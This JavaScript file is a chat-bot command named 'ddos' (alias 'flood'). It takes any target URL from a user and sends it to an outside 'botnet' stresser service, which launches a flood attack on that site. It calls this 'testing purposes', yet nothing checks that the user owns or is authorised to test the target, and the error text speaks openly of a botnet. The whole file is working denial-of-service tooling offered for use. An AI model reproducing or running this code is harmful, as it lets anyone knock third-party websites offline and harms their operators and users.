const axios = require("axios");

module.exports["config"] = {
    name: "ddos",
    type: "tools",
    role: 3,
    isPrefix: true,
    aliases: ["flood"],
    info: "Perform DDOS ATTACK on a target URL for testing purposes.",
    author: "Kenneth Panio",
    cd: 10,
    guide: "ddos http://example.com",
    usage: "[url]",
};

module.exports["run"] = async ({ args, chat, font }) => {
    const thin = txt => font.thin(txt);
    const url = args[0];
    
    if (!url) {
        return chat.reply(thin("Please provide a URL to attack."));
    }

    try {
        const response = await axios.get(`https://haji-mix-botnet.onrender.com/stresser?url=${encodeURIComponent(url)}`);
        chat.reply(thin(response.data.message));
    } catch (err) {
        if (err.response) {
            chat.reply(thin(err.response.data.error));
        } else {
            chat.reply(thin("Botnet is currently busy try again later!"));
        }
    }
};
